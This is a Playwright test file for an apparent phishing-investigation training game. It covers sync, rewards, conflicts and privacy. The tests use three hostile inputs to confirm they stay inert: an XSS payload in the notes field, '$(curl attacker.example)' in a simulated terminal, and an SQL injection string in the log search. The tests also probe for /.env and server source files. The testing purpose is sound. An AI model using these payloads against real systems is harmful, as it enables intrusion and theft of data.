const {test,expect}=require('@playwright/test');
const fs=require('node:fs');const path=require('node:path');
const sdk=fs.readFileSync(path.join(__dirname,'../support/sdk-fixture.js'),'utf8');
async function prepare(page){await page.route('https://cdn.jsdelivr.net/**',route=>route.fulfill({contentType:'text/javascript',body:sdk}));}
async function open(page){await prepare(page);await page.goto('/');await page.getByRole('button',{name:'CONTINUE WHERE I LEFT OFF'}).click();await expect(page.getByRole('heading',{name:'🎣 NexaCorp: The payroll lure'})).toBeVisible();}
async function tab(page,name){await page.locator(`[data-tab="${name}"]`).click();}
async function saved(page){await expect(page.locator('[data-status]')).toHaveText('Saved to cloud',{timeout:15000});}
async function completeReport(page){
  await tab(page,'email');await page.getByLabel('Cite MAIL-01 in report').check();await page.getByRole('button',{name:'Add email to timeline'}).click();
  await tab(page,'logs');
  for(const id of ['DNS-01','PROXY-02','AUTH-02','AUTH-03','EDR-01']){
    await page.getByLabel('Literal search').fill(id);await page.getByRole('button',{name:'Search',exact:true}).click();
    await page.getByLabel('Cite '+id,{exact:true}).check();
    if(id!=='EDR-01')await page.getByRole('button',{name:'Add to timeline',exact:true}).click();
  }
  await tab(page,'report');
  await page.getByLabel('Incident classification').selectOption('credential-phishing');
  await page.getByLabel('Severity',{exact:true}).selectOption('high');
  await page.getByLabel('Confirmed affected username').fill('alex');
  await page.getByLabel('Endpoint used for credential submission').fill('NC-WS-014');
  await page.getByLabel('Indicators (one per line; domain and relevant IP addresses)').fill('payroll-review.example\n203.0.113.44\n198.51.100.77');
  for(const id of ['revoke','reset','block','preserve'])await page.locator(`[data-containment="${id}"]`).check();
  await page.getByLabel('Analyst summary — evidence IDs, impact, scope, uncertainty and response').fill('PROXY-02 shows credential submission and AUTH-02 confirms unauthorized account access. Revoke sessions, reset credentials and preserve mailbox evidence. No endpoint malware is proven.');
}
test.beforeEach(async({request})=>{await request.post('/__test/reset');});
test('complete investigation, checkpoint refresh, one-time XP, replay, and chapter rewards',async({page,request})=>{
  const errors=[];page.on('pageerror',e=>errors.push(e.message));
  await open(page);await completeReport(page);await saved(page);
  await page.getByLabel('Analyst notes (private to your account)').fill('<img src=x onerror="window.injected=true">');await saved(page);
  await page.reload();await page.getByRole('button',{name:'CONTINUE WHERE I LEFT OFF'}).click();
  await expect(page.getByLabel('Analyst notes (private to your account)')).toHaveValue('<img src=x onerror="window.injected=true">');
  expect(await page.evaluate(()=>window.injected)).toBeUndefined();
  await page.getByRole('button',{name:'Submit for assessment'}).click();
  await expect(page.getByRole('heading',{name:'Last server assessment · 100/100 · Passed'})).toBeVisible();
  expect(await page.evaluate(()=>({xp:ST.xp,bonus:ST.socReward}))).toEqual({xp:425,bonus:150});
  await expect(page.getByText('425 XP',{exact:true})).toBeVisible();
  await request.post('/__test/unthrottle');await page.getByRole('button',{name:'Submit for assessment'}).click();
  await saved(page);expect(await page.evaluate(()=>ST.xp)).toBe(425);
  await page.getByRole('button',{name:'Complete Chapter 1',exact:true}).click();
  await expect(page.getByText('CHAPTER 1 COMPLETE',{exact:true})).toBeVisible();
  expect(await page.evaluate(()=>ST.doneChaps)).toContain(1);
  expect(await page.evaluate(()=>ST.codex.some(c=>c.term==='Phishing'))).toBe(true);
  // Projected bonus never contaminates legacy XP writes.
  await expect.poll(()=>page.evaluate(()=>JSON.parse(localStorage.getItem('test-game:'+ST.authUser.id)).xp)).toBe(275);
  expect(errors).toEqual([]);
});
test('offline edits, retry, logout/login, and independent-device cloud resume',async({page,browser})=>{
  await open(page);await tab(page,'email');await saved(page);
  await page.route('**/api/soc',route=>route.abort('failed'));
  await page.getByLabel('Analyst notes (private to your account)').fill('Offline investigation note');
  await expect(page.locator('[data-status]')).toContainText('Cloud sync failed',{timeout:15000});
  await page.unroute('**/api/soc');await page.getByRole('button',{name:'Retry sync'}).click();await saved(page);
  page.on('dialog',dialog=>dialog.accept());await page.getByRole('button',{name:/SIGN OUT/i}).click();
  await page.getByLabel('AGENT ID / EMAIL',{exact:true}).fill('agent@example.test');await page.getByLabel('SECURITY KEY',{exact:true}).fill('test-password');
  await page.getByRole('button',{name:'⚡ AUTHENTICATE'}).click();await page.getByRole('button',{name:'CONTINUE WHERE I LEFT OFF'}).click();
  await expect(page.getByLabel('Analyst notes (private to your account)')).toHaveValue('Offline investigation note');
  const second=await browser.newContext();const p=await second.newPage();await open(p);
  await expect(p.getByLabel('Analyst notes (private to your account)')).toHaveValue('Offline investigation note');await second.close();
});
test('concurrent devices retain local drafts and require explicit conflict resolution',async({page,browser})=>{
  await open(page);await tab(page,'email');await saved(page);
  const device=await browser.newContext();const other=await device.newPage();await open(other);
  await page.getByLabel('Analyst notes (private to your account)').fill('Device A draft');await saved(page);
  await other.getByLabel('Analyst notes (private to your account)').fill('Device B draft');
  await expect(other.getByRole('alert')).toContainText('Another tab or device changed');
  await expect(other.getByLabel('Analyst notes (private to your account)')).toHaveValue('Device B draft');
  await other.getByRole('button',{name:'Keep my local draft over cloud'}).click();await saved(other);
  await page.reload();await page.getByRole('button',{name:'CONTINUE WHERE I LEFT OFF'}).click();
  await expect(page.getByLabel('Analyst notes (private to your account)')).toHaveValue('Device B draft');await device.close();
});
test('terminal injection stays inert, SIEM literal search and responsive workspace',async({page})=>{
  await page.setViewportSize({width:390,height:844});await open(page);await tab(page,'terminal');
  await page.getByLabel('Command',{exact:true}).fill('$(curl attacker.example)');await page.getByRole('button',{name:'Run simulated command'}).click();
  await expect(page.locator('[data-output]')).toContainText('Command not allowed');
  await page.getByLabel('Command',{exact:true}).fill('logs proxy alex');await page.getByRole('button',{name:'Run simulated command'}).click();await expect(page.locator('[data-output]')).toContainText('PROXY-02');
  await tab(page,'logs');await page.getByLabel('Literal search').fill("' OR 1=1 --");await page.getByRole('button',{name:'Search',exact:true}).click();await expect(page.getByRole('heading',{name:'Simulated SIEM · 0 events'})).toBeVisible();
  expect(await page.evaluate(()=>document.documentElement.scrollWidth<=window.innerWidth)).toBe(true);
  await page.screenshot({path:test.info().outputPath('soc-mobile.png'),fullPage:true});
});
test('uncertain assessment retries are idempotent and edited drafts are not discarded',async({page})=>{
  await open(page);await completeReport(page);await saved(page);
  let drop=true;
  await page.route('**/api/soc',async route=>{
    if(route.request().method()==='POST' && route.request().postDataJSON().action==='submit' && drop){drop=false;await route.fetch();await route.abort('failed');return;}
    await route.continue();
  });
  await page.getByRole('button',{name:'Submit for assessment'}).click();
  await expect(page.locator('[data-status]')).toContainText('Cloud sync failed');
  await page.getByLabel('Analyst notes (private to your account)').fill('New notes after uncertain submission');
  // Retry may be triggered by autosave; both paths reuse the original receipt.
  await expect(page.getByRole('heading',{name:'Last server assessment · 100/100 · Passed'})).toBeVisible({timeout:15000});await saved(page);
  await expect(page.getByLabel('Analyst notes (private to your account)')).toHaveValue('New notes after uncertain submission');
  expect(await page.evaluate(()=>ST.xp)).toBe(425);
  await page.reload();await page.getByRole('button',{name:'CONTINUE WHERE I LEFT OFF'}).click();
  await expect(page.getByLabel('Analyst notes (private to your account)')).toHaveValue('New notes after uncertain submission');
});
test('offline refresh restores a local workspace and keeps inert evidence available',async({page})=>{
  await open(page);await tab(page,'email');await saved(page);
  await page.route('**/api/soc',route=>route.abort('failed'));
  await page.getByLabel('Analyst notes (private to your account)').fill('Offline note survives refresh');
  await expect(page.locator('[data-status]')).toContainText('Cloud sync failed');
  page.on('dialog',dialog=>dialog.accept());await page.reload();await page.getByRole('button',{name:'CONTINUE WHERE I LEFT OFF'}).click();
  await expect(page.getByLabel('Analyst notes (private to your account)')).toHaveValue('Offline note survives refresh');
  await expect(page.getByRole('heading',{name:'Email evidence · MAIL-01'})).toBeVisible();
  await page.unroute('**/api/soc');await page.getByRole('button',{name:'Retry sync'}).click();await saved(page);
});
test('server source stays private and another identity cannot see the saved investigation',async({page,browser,request})=>{
  await open(page);await page.getByLabel('Analyst notes (private to your account)').fill('Private A investigation');await saved(page);
  for(const p of ['/api/_lib/soc.js','/tests/support/sdk-fixture.js','/.env','/docs/soc-investigation.md'])expect((await request.get(p)).status()).toBe(404);
  const second=await browser.newContext();await second.addInitScript(()=>localStorage.setItem('test-identity','22222222-2222-4222-8222-222222222222'));
  const other=await second.newPage();await open(other);await expect(other.getByLabel('Analyst notes (private to your account)')).toHaveValue('');await second.close();
});
test('concurrent tabs preserve separate drafts across refresh',async({page,context})=>{
  await open(page);await tab(page,'email');await saved(page);
  const second=await context.newPage();await open(second);
  await page.getByLabel('Analyst notes (private to your account)').fill('First tab local note');
  await expect(second.getByRole('alert')).toBeVisible();
  await second.getByLabel('Analyst notes (private to your account)').fill('Second tab local note');
  await expect(page.getByRole('alert')).toBeVisible();
  page.on('dialog',dialog=>dialog.accept());await page.reload();await page.getByRole('button',{name:'CONTINUE WHERE I LEFT OFF'}).click();
  await expect(page.getByLabel('Analyst notes (private to your account)')).toHaveValue('First tab local note');
  await expect(second.getByLabel('Analyst notes (private to your account)')).toHaveValue('Second tab local note');
});
